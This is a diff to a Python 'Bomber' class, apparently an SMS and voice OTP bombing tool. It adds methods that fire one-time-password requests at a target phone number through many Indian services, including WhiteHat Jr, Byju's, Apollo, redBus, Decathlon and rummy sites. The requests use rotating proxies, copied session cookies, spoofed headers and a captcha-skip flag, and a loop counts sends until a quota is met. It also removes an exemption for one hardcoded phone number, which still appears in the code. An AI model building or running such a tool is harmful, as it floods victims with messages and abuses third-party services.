+            'origin': "https://code.whitehatjr.com",
+            'referer': "https://code.whitehatjr.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'whjr-amplitude-sessionid': "0",
+            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def whitehatjrcall(self):
+        url = "https://api.whitehatjr.com/api/V1/otp/generate"
+
+        querystring = {"deviceId": "4332e125-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659858746", "_vercel_no_cache": "1"}
+        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'",\"type\":\"voice\"}"
+        headers = {
+            'authority': "api.whitehatjr.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json;charset=UTF-8",
+            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660758684&rum=0",
+            'dnt': "1",
+            'origin': "https://code.whitehatjr.com",
+            'referer': "https://code.whitehatjr.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'whjr-amplitude-sessionid': "0",
+            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def byjus(self):
+        url = "https://mtnucleus.byjusweb.com/api/acs/v2/send-otp"
+        monumber = 7984430992
+        payload = "{\"phoneNumber\":"f'"{monumber}"'",\"page\":\"free-trial-classes\"}"
+        headers = {
+            'Referer': "https://byjus.com/",
+            'Content-Type': "application/json",
+            'sec-ch-ua-mobile': "?1",
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def playerzpot(self):
+        url = "https://msapi.playerzpot.com/v5.8/OauthNew/startSignUp"
+        payload = f"mobile_no={self.user_mobile}&game=1"
+        headers = {
+            'authority': "msapi.playerzpot.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'auth-key': "playerzpotrestapi",
+            'authorization': "",
+            'client-service': "mobile-client",
+            'content-type': "application/x-www-form-urlencoded",
+            'dnt': "1",
+            'game-mode': "1",
+            'id': "0",
+            'origin': "https://fantasycricket.playerzpot.com",
+            'platform': "1",
+            'ppm-api-key': "",
+            'referer': "https://fantasycricket.playerzpot.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def westside(self):
+        url = "https://api.tatadigital.com/api/v2/sso/check-phone"
+        payload = "{\"countryCode\":\"91\",\"phone\":"f'"{self.user_mobile}"'",\"sendOtp\":true}"
+        headers = {
+            'cookie': "ak_bmsc=F8D72AB97FB03B461E48AFC01621566A~000000000000000000000000000000~YAAQBNksMW9DRSSBAQAA2Px1QRCsLf%2FCI3HBiRDjygkfMFHELhZEcnYWbnKfeMQSRzlQnhNJTEpfowAfQP%2F3mU5gl5Qv8aM16aULOrb71CPxvA%2FaNBaqjO2SXZ4%2BI%2FCGRnzo7G2r8ZBIKxVt4QLMbmh43H60Qd8u9YBQ1f%2FPZdRBDuEwHQHnluhyxL0GQKVVb00mTjRSL8%2F0TOtNC%2Bofgw6jjj2QMem6GTgoTZCoxmlnpWZT7nXFKF3BaTwEUr1Vd2EMDkodfE5T6ScBB0uxstB%2FKFYv1DG8C06HNTfzgOT1qajvRqGFpU32N0XVNtyG1HEPT0j6y6tZiEAKqSQdPOAGPTYr5zSxq8s808IbjQdEz%2BoOeHbwpiEFh22bppnalONABHqK9BB1lngATj4D3g%3D%3D; bm_sv=FFFD86B1C8EDC6EBF2F1BBBD6E948007~YAAQBNksMbdJRSSBAQAA0892QRAE%2BJhtoZ29OfNtNfBMbO1OsPJ6VnV7SmrvFxz%2FaeTscxVXkhu9lAUUQP%2FarIyOGRPREdV9ngTJouw9h7tF98Gc6wwJPrETN%2BbXwb%2BYEExaXHGPPD1ANgXn9JYVZraeXpbNjAvoZEx5CK8QeO4Ht%2BMT1FTqu0FopMuHW3%2BRJ0i3ZJeqOiTExkX3GMou%2BWyAjvrhzYq1el0EW4K41dT6UE8FS0lkIIYminwiKeqqvSBrDIE%3D~1",
+            'authority': "api.tatadigital.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'client_id': "WESTSIDE-WEB-APP",
+            'content-type': "application/json",
+            'dnt': "1",
+            'origin': "https://www.westside.com",
+            'referer': "https://www.westside.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "cross-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def appolo(self):
+        url = "https://apiservices.askapollo.com/api/AskApolloWeb/SendOTPForVerificationv2"
+        payload = "{\"lstEmails\":[],\"lstMobiles\":["f'"{self.user_mobile}"'"],\"skipCaptcha\":true,\"leadSource\":\"Angular-PhysicalAppointment-Login\"}"
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'Content-Type': "application/json",
+            'Accept': "application/json, text/plain, */*",
+            'xauthtoken': "AAWEBLIVE-29SUBFEIBP8CXGGJOJ7W",
+            'Referer': "https://www.askapollo.com/",
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def khatabook(self):
+        url = "https://api.khatabook.com/v1/auth/request-otp"
+        payload = "{\"country_code\":\"+91\",\"phone\":"f'"{self.user_mobile}"'",\"app_signature\":\"Jc/Zu7qNqQ2\",\"enableUserPref\":false}"
+        headers = {
+            'Accept': "*/*",
+            'Accept-Language': "en-US,en;q=0.9",
+            'Connection': "keep-alive",
+            'DNT': "1",
+            'Origin': "https://web.khatabook.com",
+            'Referer': "https://web.khatabook.com/",
+            'Sec-Fetch-Dest': "empty",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Site': "same-site",
+            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'content-type': "application/json",
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def playrummy(self):
+        url = "https://www.playrummy.com/updateData.php"
+        payload = f"data=sms_download_link&mobile={self.user_mobile}&source=download-web"
+        headers = {
+            'authority': "www.playrummy.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+            'cookie': "PHPSESSID=j02f6s41cah2rcrg8dkrbdt4g2; client_sid=WEB-103.240.76.144-1654661365; _gcl_au=1.1.1352135722.1654661365; _ga_V5JSM6KL3N=GS1.1.1654661365.1.0.1654661365.60; _ga=GA1.1.701454313.1654661366",
+            'dnt': "1",
+            'origin': "https://www.playrummy.com",
+            'referer': "https://www.playrummy.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-requested-with': "XMLHttpRequest"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def redbus(self):
+        url = "https://m.redbus.in/api/getOtp"
+        querystring = {"number": self.user_mobile, "cc": "91",
+                       "whatsAppOpted": "false", "disableOtpFlow": "undefined"}
+
+        payload = ""
+        headers = {
+            'cookie': "bm_mi=55F56430F94936E87F0DA8DC88A02E08~YAAQH18sMdyaYQWBAQAA7g+GQRADjqxmbjVRe3AUkcQgXe9BjTCkY7FAse2KB9871iFYU6/nYQL4yTHk4ZMuUyGz68CVmSbKwjlfPKzDxgTYXGZoAHmWo3zrCwUUBRHITqZHd1VmYQYK0qWxpphcRoHaomzIlxr3dOQuX4jmftyn9XGnWPWpaDDjI1+VqunG90prkOsi1XmNbK8+P57oHiwv+AwOhmWAJHArB6UcXVQp4TaizlSrhzxzUWhfO778qZLPfRTcWsOrtTMbtiCTBM47LetMul9XtU1Xmsa55HqNbrWO0t/hLw3urnz1~1; _gcl_au=1.1.635915280.1654661714; _ga=GA1.1.538343953.1654661715; ak_bmsc=A3E03A571BC5FC92C76657606D4BEEE7~000000000000000000000000000000~YAAQb4IsMf/mUxmBAQAA5VCGQRA4A05YVPvB25subA4y0jh8AWhefIAB3NTs2EVNAh3NS6of7eq9AYEHDnRNpZKpwrKD1KMUCmt/ia6dcTTLBTZ3OGJJQvE0Kjb+KieV5Qa5lyYJeHcWPcTtI9RuMqJC67wc0TbWAJ7q0fnUMRE4lqboi+3OcBJks+zfMWdVfioO7VOJBXqYVcBeujNHK7TM42rYCLJ3mwAy+AmaZOs9D+hOfEizqJVNX0HCcuFxU649EQmOLOXCEQVhcGx9+IQ+s8JCVtT90i2VPgGPVPJ5aTbnBJOXIkI4nl3Unc2QwZZocJV7eHOtw8MK5HbhUTxYynajvEeNUOJKUXpZWJRg93+bU6fS1G3UmKlfgBh/gN1NwValJT7RQIjv5+q8GnwZ6DB7VYdOmfr90vdAqbYOxc8EHVPcTZlcXl4Z7e85hISOboGcB/ToH0ECutKFT99yyfNXybJvOrSxC6k+/IBk8QbCT+ATUsh6i5+cSMdVAmfLDkcvcmuxyAmDMS1xKdA=; _ga_7H5CPBRKXZ=GS1.1.1654661714.1.1.1654661746.28; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga_SVPLT0D8E8=GS1.1.1654661747.1.0.1654661747.60; rbuuid=af3a33e0-e6e1-11ec-b5b2-a13bb9d94460; userSessionId=ID_rjhtlpj19; userSessionCookie=af3a33e1-e6e1-11ec-b5b2-a13bb9d94460; country_ISO=IN; mriClientId=42f6ebe8-c5b3-4f6a-8a2f-ccc7d1c3a3a3-2dsojceOTthIysKXJOUpJw%3D%3D; mriClientIdSetDate=Wed%20Jun%2008%202022%2004%3A15%3A52%20GMT%2B0000%20(Coordinated%20Universal%20Time); mriBrowserFPSet=true; mriSessionId=6446b735-b4bb-4e8d-b847-1a3cdcffb939-Kmh8aUn-uI11k8DILNV#8qSQpVE=; bm_sv=9E5A85B675E57E40AB2B29882F3E49D4~YAAQH18sMfScYQWBAQAACseGQRDuQcFCx69gP6P3h/1Ag5u1uNNd//ZiBYFzAuOSV9ii/iKM+jeLqBLKhJebH68JiIkOzYm/VAXH+qWG+9sttVVCoL8IlxVYkTgoVAk3GY9h+ViINYpVVjuA4K9c/wM3NMy+t/l/zjHILCM5SbQea1uqxp0kAR+ydgnIpUQDenYTamC5a25ChUobR1IWus40yMz1U0fzyusd0J45pw+AzIvxEhLMT7Z+HMlLYUpV~1",
+            'authority': "m.redbus.in",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'dnt': "1",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'traceparent': "00-cd75923cc440989066e258a2c05178cf-98e70b8548ee305a-01",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def decathon(self):
+        url = "https://www.decathlon.in/api/login/sendotp"
+        payload = "{\"param\":"f'"{self.user_mobile}"'",\"source\":1}"
+        headers = {
+            'authority': "www.decathlon.in",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json;charset=UTF-8", 'dnt': "1",
+            'origin': "https://www.decathlon.in",
+            'referer': "https://www.decathlon.in/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def khelplay(self):
+        url = "https://www.khelplayrummy.com/component/weaver"
+
+        querystring = {"task": "registration.otpBasedCommonAjaxFunction"}
+        payload = f"control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName={self.user_mobile}&isAjax=true"
+        headers = {
+            'authority': "www.khelplayrummy.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+            'dnt': "1",
+            'origin': "https://www.khelplayrummy.com",
+            'referer': "https://www.khelplayrummy.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-requested-with': "XMLHttpRequest"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
+            return True
+
+    def whatjrcall(self):
+        url = "https://api.whitehatjr.com/api/V1/otp/generate"
+
+        querystring = {"deviceId": "4332e125-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659858746", "_vercel_no_cache": "1"}
+
+        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'",\"type\":\"voice\"}"
+        headers = {
+            'authority': "api.whitehatjr.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json;charset=UTF-8",
+            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660758684&rum=0",
+            'dnt': "1",
+            'origin': "https://code.whitehatjr.com",
+            'referer': "https://code.whitehatjr.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'whjr-amplitude-sessionid': "0",
+            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 200):
             return True
 
     def startBombing(self):
-        if(self.user_mobile == 7984430992):
-            return True
 
         if(self._checkinternet()):
             counter = 0
@@ -926,7 +1392,39 @@ class Bomber:
                     counter += 1
                 if self.netmeds():
                     counter += 1
-                if self.delhivery():
+                if self.classicRummy():
+                    counter += 1
+                if self.classicRummy2():
+                    counter += 1
+                if self.nnow():
+                    counter += 1
+                if self.gamezy():
+                    counter += 1
+                if self.gamezzy():
+                    counter += 1
+                if self.upstocks():
+                    counter += 1
+                if self.whitehatjr():
+                    counter += 1
+                if self.byjus():
+                    counter += 1
+                if self.playerzpot():
+                    counter += 1
+                if self.westside():
+                    counter += 1
+                if self.appolo():
+                    counter += 1
+                if self.khatabook():
+                    counter += 1
+                if self.playrummy():
+                    counter += 1
+                if self.redbus():
+                    counter += 1
+                if self.decathon():
+                    counter += 1
+                if self.khelplay():
+                    counter += 1
+                if self.whatjrcall():
                     counter += 1
 
                 if(counter >= self.number_of_messege):
